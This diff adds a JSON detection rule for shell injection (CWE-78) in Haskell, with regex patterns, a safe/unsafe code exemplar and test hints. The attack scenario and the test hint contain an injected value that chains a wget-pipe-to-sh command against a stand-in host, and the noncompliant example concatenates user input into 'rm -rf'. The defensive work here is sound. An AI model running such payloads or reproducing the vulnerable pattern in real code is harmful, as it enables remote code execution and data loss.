@@ -1,0 +1,35 @@
+{
+  "cwe_id": "CWE-78",
+  "name": "Haskell shell command built with string concatenation",
+  "rank": 0,
+  "kev": false,
+  "task_triggers": [
+    "run shell command",
+    "System.Process",
+    "callCommand",
+    "shell out",
+    "execute external program",
+    "build command line"
+  ],
+  "patterns": [
+    {
+      "lang": "haskell",
+      "confidence": "high",
+      "re": "\\b(?:callCommand|runCommand|runInteractiveCommand|system)\\b[^\\n]*\\+\\+"
+    },
+    {
+      "lang": "haskell",
+      "confidence": "medium",
+      "re": "\\bshell\\b\\s*[(\"$][^\\n]*\\+\\+"
+    }
+  ],
+  "attack_scenario": "userPath = \"/tmp; wget evil/x -O- | sh\" executes the injected pipeline.",
+  "negative_test_hint": [
+    "feed userPath = \"/tmp; wget evil/x -O- | sh\" and assert no injected pipeline executes because arguments go through callProcess, not the shell"
+  ],
+  "exemplar": {
+    "noncompliant": "callCommand (\"rm -rf \" ++ userPath)",
+    "compliant": "callProcess \"/bin/rm\" [\"-rf\", userPath]",
+    "explanation": "system, callCommand and the shell CmdSpec run the string through /bin/sh -c, so concatenating user data into it with ++ is shell injection. callProcess/proc with an argument list bypass the shell entirely, keeping user input inert."
+  }
+}
